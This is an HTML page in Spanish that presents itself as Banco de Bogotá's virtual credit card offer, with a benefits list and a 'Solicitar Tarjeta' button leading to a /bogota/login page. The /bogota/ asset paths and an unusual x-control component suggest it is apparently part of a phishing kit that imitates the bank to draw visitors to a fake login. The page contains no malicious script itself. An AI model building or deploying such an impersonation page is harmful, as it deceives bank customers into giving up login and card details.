<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
    <title>Tarjeta Virtual - Banco de Bogotá</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />
    <style>
        @font-face {
            font-family: Roboto-Light;
            src: url(/bogota/ce61b8b68994802f2e55.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Regular;
            src: url(/bogota/6bede58e856278b0f8f1.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Medium;
            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Bold;
            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
            font-display: swap
        }

        body {
            font-family: Roboto-Regular;
            background-color: #f7f7f7;
        }

        .texto-titulo {
            font-size: 24px;
            font-family: Roboto-Bold;
            color: #0043a9;
        }

        .texto-subtitulo {
            font-size: 18px;
            font-family: Roboto-Medium;
            color: #000000;
        }

        .texto-normal {
            font-size: 14px;
            font-family: Roboto-Regular;
            color: #444444;
        }

        .boton-principal {
            font-size: 16px;
            font-family: Roboto-Medium;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: 100px;
            cursor: pointer;
            padding: 12px 24px;
            border: solid 1px #0043a9;
            background-color: #0043a9;
            color: #ffffff;
            transition: .3s;
            text-decoration: none;
        }

        .boton-principal:hover {
            background-color: #003080;
            color: #ffffff;
        }

        .card-beneficio {
            background: #ffffff;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .icono-beneficio {
            width: 48px;
            height: 48px;
            background-color: #e8f0fe;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #0043a9;
            font-size: 24px;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 50%;
                margin: 0 auto;
            }
        }
    </style>
</head>

<body>
    <!-- Header -->
    <div class="bg-white py-3 px-3">
        <div class="d-flex justify-content-between align-items-center">
            <img src="/bogota/logo_bogota_1.svg" width="200" height="auto" alt="Banco de Bogotá">
            <div class="d-flex align-items-center">
                <span class="texto-normal me-2">Menú</span>
                <i class="bi bi-three-dots-vertical"></i>
            </div>
        </div>
    </div>

    <!-- Banner Principal -->
    <div class="bg-white p-4 mb-3">
        <h1 class="texto-titulo mb-3">Tarjeta de Crédito Virtual Banco de Bogotá</h1>
        <p class="texto-normal">Tarjeta 100% virtual que podrás usar inmediatamente en compras por internet y en comercios físicos a través de tus dispositivos electrónicos.</p>
        <a href="/bogota/login" class="boton-principal mt-3">
            Solicitar Tarjeta
            <i class="bi bi-arrow-right ms-2"></i>
        </a>
        <div class="text-center mt-4">
            <img src="/bogota/banner_bogota.png" class="img-fluid" alt="Tarjeta Virtual">
        </div>
    </div>

    <!-- Beneficios -->
    <div class="p-3">
        <h2 class="texto-titulo text-center mb-4">Beneficios</h2>

        <div class="card-beneficio d-flex align-items-start">
            <div class="icono-beneficio me-3">
                <i class="bi bi-credit-card"></i>
            </div>
            <div>
                <h3 class="texto-subtitulo">Compra de inmediato</h3>
                <p class="texto-normal mb-0">Compra en línea con los datos de tu tarjeta o paga en comercios físicos con Apple Pay o Google Pay.</p>
            </div>
        </div>

        <div class="card-beneficio d-flex align-items-start">
            <div class="icono-beneficio me-3">
                <i class="bi bi-tag"></i>
            </div>
            <div>
                <h3 class="texto-subtitulo">Ofertas y descuentos</h3>
                <p class="texto-normal mb-0">Disfruta ofertas exclusivas en tus marcas favoritas. Todos los fines de semana una oferta diferente.</p>
            </div>
        </div>

        <div class="card-beneficio d-flex align-items-start">
            <div class="icono-beneficio me-3">
                <i class="bi bi-star"></i>
            </div>
            <div>
                <h3 class="texto-subtitulo">Puntos de fidelidad</h3>
                <p class="texto-normal mb-0">Regístrate, acumula y redime tus puntos en lo que más te gusta.</p>
            </div>
        </div>

        <div class="card-beneficio d-flex align-items-start">
            <div class="icono-beneficio me-3">
                <i class="bi bi-cash-stack"></i>
            </div>
            <div>
                <h3 class="texto-subtitulo">Avances</h3>
                <p class="texto-normal mb-0">Solicítalos en la app. Hasta por el 100% del cupo por transferencia a una cuenta.</p>
            </div>
        </div>

        <div class="card-beneficio d-flex align-items-start">
            <div class="icono-beneficio me-3">
                <i class="bi bi-globe"></i>
            </div>
            <div>
                <h3 class="texto-subtitulo">Respaldo en todo el mundo</h3>
                <p class="texto-normal mb-0">En caso de robo o pérdida, recibe asistencia para avances en efectivo o reemplazo temporal.</p>
            </div>
        </div>

        <div class="card-beneficio d-flex align-items-start">
            <div class="icono-beneficio me-3">
                <i class="bi bi-shield-check"></i>
            </div>
            <div>
                <h3 class="texto-subtitulo">Seguridad garantizada</h3>
                <p class="texto-normal mb-0">Tu tarjeta virtual cuenta con los más altos estándares de seguridad para proteger tus transacciones.</p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="bg-white text-center py-4 mt-4">
        <img src="/bogota/logo_bogota_1.svg" width="150" height="auto" alt="Banco de Bogotá">
        <p class="texto-normal mt-3 mb-0">Copyright © 2025 Banco de Bogotá</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
